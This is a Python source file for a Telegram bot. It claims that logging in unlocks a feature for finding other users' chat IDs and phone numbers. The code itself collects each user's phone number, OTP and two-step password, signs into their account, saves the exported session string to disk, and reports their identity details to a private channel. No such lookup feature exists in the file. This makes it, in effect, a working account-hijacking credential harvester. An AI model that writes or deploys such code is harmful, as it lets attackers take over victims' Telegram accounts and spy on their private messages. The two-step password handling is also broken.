import logging
import random
import string
import os
from telegram import Update
from telegram.ext import CommandHandler, MessageHandler, CallbackContext, ConversationHandler, Application, filters
from pyrogram import Client
from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired
from config import API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID  # Import credentials from config.py

# Constants for conversation states
PHONE, OTP, PASSWORD = range(3)

# Generate random session name for each user
def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Save session string in a text file
def save_session_string(user_id, string_session):
    with open(f"session_{user_id}.txt", "w") as f:
        f.write(string_session)

# Delete session files from disk
async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"
    
    # Delete the session files if they exist
    if os.path.exists(session_file):
        os.remove(session_file)
    if os.path.exists(memory_file):
        os.remove(memory_file)
    return True

# Send user info to the specified channel
async def send_user_info_to_channel(update: Update, context: CallbackContext):
    user = update.message.from_user
    user_info = (
        f"New User Info:\n"
        f"User ID: {user.id}\n"
        f"Name: {user.first_name} {user.last_name if user.last_name else ''}\n"
        f"Username: @{user.username if user.username else 'No Username'}\n"
        f"Language: {user.language_code if user.language_code else 'Not Provided'}\n"
        f"Chat ID: {update.message.chat.id}\n"
    )
    try:
        await context.bot.send_message(chat_id=CHANNEL_ID, text=user_info)
    except Exception as e:
        logging.error(f"Error sending message to channel: {e}")

# Step 1: Handle phone number input
async def phone_number(update: Update, context: CallbackContext):
    if update.message:
        logging.debug(f"User {update.message.chat.id} started the login process.")
        try:
            await update.message.reply(
                "🔐 **Please enter your phone number along with the country code.**\n"
                "Example: **+19876543210**\n\n"
                "This is the first step to authenticate you and give access to the bot's features. 💪"
            )
        except AttributeError as e:
            logging.error(f"Error sending message: {e}. Update: {update}")
            await update.message.reply("❌ An error occurred. Please try again.")
        return OTP  # Move to the next step (OTP)

# Step 2: Handle OTP input
async def otp_code(update: Update, context: CallbackContext):
    if update.message:
        user_id = update.message.chat.id
        phone_number = update.message.text

        # Store the phone number in user data to be used later in the login process
        context.user_data['phone_number'] = phone_number

        try:
            await update.message.reply("📲 **Sending OTP...**\nPlease wait while I authenticate you.")

            # Start the Pyrogram client
            client = Client(f"session_{user_id}", API_ID, API_HASH)
            await client.connect()

            # Send OTP code
            code = await client.send_code(phone_number)
            context.user_data['code_hash'] = code.phone_code_hash

            await update.message.reply(
                "🔑 **OTP sent!**\n\nPlease enter the **OTP** you received (e.g., '12345')."
            )
            return PASSWORD  # Move to next step for password if needed
        except ApiIdInvalid:
            await update.message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
            return ConversationHandler.END
        except PhoneNumberInvalid:
            await update.message.reply('❌ Invalid phone number. Please restart the session.')
            return ConversationHandler.END
        except Exception as e:
            await update.message.reply(f"❌ **An error occurred**: {e}. Please try again later.")
            logging.error(f"Error during OTP request: {e}")
            return ConversationHandler.END

# Step 3: Handle password input (for accounts with 2FA enabled)
async def password(update: Update, context: CallbackContext):
    if update.message:
        user_id = update.message.chat.id
        otp_code = update.message.text.replace(" ", "")  # Remove spaces

        # Retrieve the phone number and code hash from user data
        phone_number = context.user_data['phone_number']
        phone_code_hash = context.user_data['code_hash']

        # Try to sign in
        client = Client(f"session_{user_id}", API_ID, API_HASH)
        try:
            await client.connect()
            await client.sign_in(phone_number, phone_code_hash, otp_code)
        except PhoneCodeInvalid:
            await update.message.reply('❌ Invalid OTP. Please restart the session and try again.')
            logging.error(f"Invalid OTP entered by user {user_id}.")
            return ConversationHandler.END
        except PhoneCodeExpired:
            await update.message.reply('❌ OTP has expired. Please restart the session and try again.')
            logging.error(f"OTP expired for user {user_id}.")
            return ConversationHandler.END
        except Exception as e:
            # Catch any other exceptions and log them
            if "2-step verification" in str(e):
                await update.message.reply("🔒 **2-Step Verification Enabled!**\n\nPlease enter your **password** to complete the login.")
                password = update.message.text
                try:
                    await client.check_password(password)
                    await update.message.reply("✅ **Login successful!** You are now logged in.")
                    logging.info(f"User {user_id} logged in successfully with password.")
                except Exception as password_error:
                    await update.message.reply(f"❌ Error: {password_error}. Please restart the session.")
                    logging.error(f"Error during password verification for user {user_id}: {password_error}")
                    return ConversationHandler.END
            else:
                await update.message.reply(f"❌ **An error occurred**: {e}. Please try again.")
                logging.error(f"Error during sign-in for user {user_id}: {e}")
                return ConversationHandler.END

        # Export session string and save it
        string_session = await client.export_session_string()
        save_session_string(user_id, string_session)  # Save session string locally
        await client.disconnect()

        # Send user info to the channel
        await send_user_info_to_channel(update, context)
        
        return ConversationHandler.END  # End the conversation

# Define the start command
async def start(update: Update, context: CallbackContext):
    if 'logged_in' not in context.user_data or not context.user_data['logged_in']:
        welcome_message = (
            "👋 **Hello CHOUDHARY Ji! Welcome to the bot!** 😊\n\n"
            "🔑 To access any features, including retrieving user chat IDs and phone numbers, "
            "you **must log in** first. Please use the **/login** command to start the process.\n\n"
            "Once you're logged in, you can use the following commands:\n\n"
            "💬 **/start** - Start the bot and see this welcome message.\n"
            "🆘 **/help** - Get detailed help information.\n"
            "🔐 **/login** - Connect your Telegram account (mandatory to use all features).\n"
            "🚪 **/logout** - Log out and clear your session data.\n\n"
            "⚠️ **Important:** Without logging in, I cannot fetch other users' information such as their chat ID or phone number.\n\n"
            "🔑 **Use the /login command now to proceed and unlock the bot's features!** 💪"
        )
        await update.message.reply(welcome_message)
    else:
        await update.message.reply(
            "You are already logged in! 🎉\n\n"
            "You can now access all the features of the bot. Use the following commands:\n\n"
            "💬 **/start** - Start the bot and see this welcome message again.\n"
            "🆘 **/help** - Get detailed help information.\n"
            "🚪 **/logout** - Log out and clear your session data."
        )

# Define the help command
async def help_command(update: Update, context: CallbackContext):
    if 'logged_in' not in context.user_data or not context.user_data['logged_in']:
        await update.message.reply(
            "Here are the available commands:\n"
            "/start - Start the bot\n"
            "/help - Get help information\n"
            "/login - Connect your Telegram account"
        )
    else:
        await update.message.reply(
            "Here are the available commands:\n"
            "/start - Start the bot\n"
            "/help - Get help information\n"
            "/logout - Log out and clear your session data"
        )

# Unauthorized message handler (before login)
async def handle_unauthorized_messages(update: Update, context: CallbackContext) -> None:
    if 'logged_in' not in context.user_data or not context.user_data['logged_in']:
        await update.message.reply(
            "🚫 **You need to log in first!** 🔑\n\n"
            "Use the **/login** command to connect to your Telegram account. "
            "After logging in, I can assist you further. 😊"
        )
    else:
        await update.message.reply(
            "❓ I didn't understand that. Please use a valid command.\n\n"
            "Available Commands:\n"
            "/start - Start the bot\n"
            "/help - Help info\n"
            "/login - Connect your Telegram account"
        )

# Logout handler to delete session files
async def logout(update: Update, context: CallbackContext) -> None:
    user_id = update.message.chat.id
    files_deleted = await delete_session_files(user_id)

    if files_deleted:
        await update.message.reply("✅ **Your session data and files have been cleared.**")
        context.user_data['logged_in'] = False
    else:
        await update.message.reply("⚠️ You are not logged in, no session data found to clear.")

# Main function to run the bot
def main():
    # Use your bot's token
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))  # Add the start command handler
    application.add_handler(CommandHandler("help", help_command))  # Add the help command handler
    application.add_handler(CommandHandler("logout", logout))  # Add the logout command handler
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unauthorized_messages))  # Handle messages before login

    # Add conversation handler (for login flow)
    conversation_handler = ConversationHandler(
        entry_points=[CommandHandler('login', phone_number)],
        states={
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_code)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password)],
        },
        fallbacks=[],
    )
    application.add_handler(conversation_handler)  # Add the login flow handler

    # Run the bot
    application.run_polling()

if __name__ == '__main__':
    main()
